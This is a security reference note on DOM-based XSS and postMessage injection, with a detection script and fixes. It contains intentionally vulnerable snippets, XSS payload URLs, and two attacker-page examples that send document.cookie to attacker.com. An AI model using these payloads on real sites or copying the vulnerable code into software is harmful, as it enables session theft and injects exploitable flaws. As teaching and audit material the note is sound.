# DOM-Based XSS & postMessage

**Tags:** #medium #high #xss #dom #javascript #client-side
**OWASP:** A03:2021 Injection
**CVSS Base:** 6.1 (Medium) → 8.2 (High → with unrestricted CORS/postMessage)

---

## 📖 What is it

**DOM-Based XSS:** the payload never reaches the server — it flows from a DOM *source* (URL, hash, referrer) directly to a DOM *sink* (innerHTML, eval) in the victim's browser.

**postMessage Injection:** when `window.addEventListener('message', ...)` does not validate the sender's origin, any page can send data that gets processed as code.

---

## 🔍 `grep_search` Tactics

```
# DOM Sources — where input enters
location.hash
location.search
location.href
document.URL
document.referrer
window.name

# DOM Sinks — where execution occurs
innerHTML
outerHTML
document.write(
document.writeln(
eval(
setTimeout(str
setInterval(str
element.src =
.href = 
insertAdjacentHTML

# postMessage
addEventListener('message'
addEventListener("message"
window.addEventListener
postMessage
```

---

## 💣 DOM-Based XSS — Examples

### Via `location.hash`

```javascript
//  VULNERABLE — hash directly into innerHTML
const search = location.hash.slice(1);  // #<script>alert(1)</script>
document.getElementById('output').innerHTML = search;  // DANGEROUS SINK
```

**Exploit:**
```
http://target.com/page#<img src=x onerror=alert(document.cookie)>
```

### Via `location.search`

```javascript
//  VULNERABLE — query string into document.write
const params = new URLSearchParams(location.search);
const name = params.get('name');
document.write('<h1>Hello ' + name + '</h1>');  // DANGEROUS SINK
```

**Exploit:**
```
http://target.com/?name=<script>alert(1)</script>
```

### Via `document.referrer`

```javascript
//  VULNERABLE
const referrer = document.referrer;
document.getElementById('back').innerHTML = 'Back to: ' + referrer;
```

**Exploit:** set up a page on a controlled domain that redirects to target.com with a payload in the Referer header.

### Via `window.name`

```javascript
//  VULNERABLE — window.name persists across navigations
document.getElementById('msg').innerHTML = window.name;
```

**Exploit:**
```html
<!-- On a controlled page -->
<script>
window.name = "<img src=x onerror=fetch('https://attacker.com/?c='+document.cookie)>";
location = "https://target.com/vulnerable-page";
</script>
```

---

## 💣 postMessage Without Origin Validation

### Vulnerable Code

```javascript
//  CRITICAL — any origin can send messages that get executed
window.addEventListener('message', (event) => {
    // No check of event.origin!
    eval(event.data);                              // DOM RCE
});

window.addEventListener('message', (event) => {
    document.getElementById('content').innerHTML = event.data;  // DOM XSS
});

window.addEventListener('message', (event) => {
    const config = JSON.parse(event.data);
    location.href = config.redirectUrl;            // Open Redirect
});
```

### postMessage Exploit

```html
<!-- evil.html at http://attacker.com -->
<iframe src="https://target.com/app" id="victim-frame"></iframe>
<script>
    // Wait for the iframe to load
    document.getElementById('victim-frame').onload = function() {
        const frame = document.getElementById('victim-frame').contentWindow;
        
        // Inject script via postMessage
        frame.postMessage("fetch('https://attacker.com/?c='+document.cookie)", '*');
        
        // Or XSS via innerHTML
        frame.postMessage('<img src=x onerror=alert(document.domain)>', '*');
    };
</script>
```

---

## ✅ Fix

### DOM-Based XSS

```javascript
//  CORRECT — use textContent instead of innerHTML
const name = new URLSearchParams(location.search).get('name');
document.getElementById('output').textContent = name;  // escapes automatically

//  CORRECT — sanitize if innerHTML is required
import DOMPurify from 'dompurify';
const safe = DOMPurify.sanitize(userInput);
element.innerHTML = safe;
```

### postMessage With Origin Validation

```javascript
//  CORRECT — whitelist of trusted origins
const TRUSTED_ORIGINS = new Set([
    'https://app.mycompany.com',
    'https://admin.mycompany.com',
]);

window.addEventListener('message', (event) => {
    // ALWAYS verify origin before processing
    if (!TRUSTED_ORIGINS.has(event.origin)) {
        console.warn('Untrusted origin rejected:', event.origin);
        return;
    }
    
    // Process only after validation
    const data = JSON.parse(event.data);
    //  never use eval() with event.data
    displayContent(data.text);  // safe function, no eval or innerHTML
});
```

---

## 🧪 Static Detection Script

```python
# .tmp/find_dom_xss.py
import re, os

DOM_SOURCES = [
    'location.hash', 'location.search', 'location.href',
    'document.URL', 'document.referrer', 'window.name'
]

DOM_SINKS = [
    'innerHTML', 'outerHTML', 'document.write', 'document.writeln',
    r'\beval\(', r'setTimeout\([^,]+,', r'setInterval\([^,]+,',
    'insertAdjacentHTML', '.src =', '.href ='
]

JS_EXTENSIONS = ('.js', '.ts', '.jsx', '.tsx', '.html', '.htm')

findings = []

for root, dirs, files in os.walk('.'):
    # Exclude node_modules
    dirs[:] = [d for d in dirs if d not in ['node_modules', '.git', 'dist']]
    
    for file in files:
        if not file.endswith(JS_EXTENSIONS):
            continue
        
        path = os.path.join(root, file)
        try:
            content = open(path, encoding='utf-8', errors='ignore').read()
            lines = content.split('\n')
            
            for i, line in enumerate(lines, 1):
                has_source = any(src in line for src in DOM_SOURCES)
                has_sink = any(re.search(sink, line) for sink in DOM_SINKS)
                
                if has_source or has_sink:
                    findings.append((path, i, line.strip()))
        except Exception:
            pass

print(f"=== DOM XSS Source/Sink Analysis ===\n")
for path, line_num, line in findings[:50]:
    print(f"{path}:{line_num}: {line[:100]}")
```

---

## 🔗 Chain Exploits

```
DOM XSS via hash → link sent via phishing → session theft without stored XSS
postMessage without origin → iframe on attacker's domain → cross-origin exfiltration
DOM XSS + localStorage with sensitive data → persistent token theft
postMessage + window.location = data → chained Open Redirect → OAuth phishing
DOM Clobbering → named form elements overwrite global vars → XSS via legacy code
```

---

## 📌 References
- [[xss-cross-site-scripting]]
- [[cors-misconfiguration]]
- [[http-security-headers]]
- [[open-redirect]]
- [PortSwigger DOM XSS](https://portswigger.net/web-security/cross-site-scripting/dom-based)